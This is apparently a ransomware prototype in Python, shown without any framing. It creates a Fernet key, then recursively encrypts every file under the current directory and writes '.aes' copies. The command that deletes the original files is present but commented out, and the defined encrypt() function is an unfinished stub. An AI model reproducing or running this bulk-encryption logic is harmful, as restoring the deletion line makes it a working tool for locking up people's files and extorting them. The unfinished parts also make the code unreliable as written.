from cryptography.fernet import Fernet
import glob
import os
# Get current directory
curDir = os.getcwd()

def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()

def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(key)

write_key()
# load the previously generated key
key = load_key()
# initialize the Fernet class
f = Fernet(key)
#file_list = os.listdir(curDir)
print('\n Beginning recursive encryption...\n\n')
# Main loop to encrypt all files recursively
# now the loop ignore the root folder of where it is
for x in glob.glob(curDir +'/**/*/*', recursive=True):

    fullpath = os.path.join(curDir, x)
    fullnewf = os.path.join(curDir, x + '.aes')
    # Encrypt
    if os.path.isfile(fullpath):
        print('>>> Original: \t' + fullpath + '')
        print('>>> Encrypted: \t' + fullnewf + '\n')
        with open(fullpath, "rb") as file:             # read all file data
            file_data = file.read()
       
        encrypted_data = f.encrypt(file_data)  # encrypt data

         # write the encrypted file
        with open(fullnewf, "wb") as file:
            file.write(encrypted_data)

       # os.remove(fullpath)
